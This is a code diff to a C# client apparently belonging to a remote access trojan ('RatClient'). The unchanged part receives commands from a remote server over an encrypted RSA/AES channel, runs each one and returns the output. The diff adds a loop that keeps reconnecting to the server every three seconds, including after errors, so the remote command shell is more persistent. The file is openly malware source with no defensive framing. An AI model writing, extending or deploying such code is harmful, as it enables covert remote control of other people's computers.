@@ -1,5 +1,4 @@
-﻿using RatClient.Mtool;
-using RatClient.SymetricCrypto;
+﻿using RatClient.SymetricCrypto;
 using RatClient.AcRSA;
 using System.Numerics;
 using System;
@@ -9,7 +8,6 @@ using System.Runtime.Serialization.Json;
 using System.Text;
 using System.Threading;
 using System.Security.Cryptography;
-using System.Linq;
 using static Info;
 
 
@@ -22,16 +20,17 @@ namespace RatClient
         private Tuple<string, int> servInfo;
         private AESCyrpto Acaes;
         private TcpClient client;
-
+        string serverIP;
+        int Port;
 
         public Client(string serverIP, int Port, BigInteger[] PublicKey)
         {
             this.PublicKey = PublicKey;
-            this.servInfo = new Tuple<string, int>(serverIP, Port);
-            this.client = new TcpClient(serverIP, Port);
-            this.Acaes = new AESCyrpto(null,null);
-            SendClientInfo();
+            this.serverIP = serverIP;
+            this.Port = Port;
+            Resetor();
         }
+
         private static byte[] SerializeToJson<T>(T obj)
         {
             using (MemoryStream ms = new MemoryStream())
@@ -72,6 +71,28 @@ namespace RatClient
             return Acaes.Decrypt(res);
         }
 
+        private void Resetor()
+        {
+            while (true)
+            {
+                try
+                {
+                    this.servInfo = new Tuple<string, int>(serverIP, Port);
+                    this.client = new TcpClient(serverIP, Port);
+                    this.Acaes = new AESCyrpto(null, null);
+                    SendClientInfo();
+                    Console.WriteLine("Completed!");
+                    return;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"{ex.Message}");
+                }
+                {
+                    Thread.Sleep(3000);
+                }
+            }
+        }
 
         private void SetSyncAes()
         {
@@ -101,7 +122,7 @@ namespace RatClient
                     else if (bytesRead > 0)
                     {
                         byte[] randomBytes = new byte[1];
-                        using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
+                        using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) 
                         {
                             rng.GetBytes(randomBytes);
                         }
@@ -111,6 +132,7 @@ namespace RatClient
                 catch (Exception e)
                 {
                     Console.WriteLine(e);
+                    Resetor();
                 }
                 Thread.Sleep(1000);
             }
@@ -120,14 +142,22 @@ namespace RatClient
             SetSyncAes();
             while (true)
             {
-                string command = Encoding.UTF8.GetString(ReadMsg());
-                if (command == "exit")
+                try
                 {
-                    Console.WriteLine("Ending Session");
-                    break;
+                    string command = Encoding.UTF8.GetString(ReadMsg());
+                    if (command == "exit")
+                    {
+                        Console.WriteLine("Ending Session");
+                        break;
+                    }
+                    SendMsg(Tools.RunCommand(command));
                 }
-                SendMsg(Tools.RunCommand(command));
+                catch
+                {
+                    return;
+                }
             }
+                
         }
     }
 }
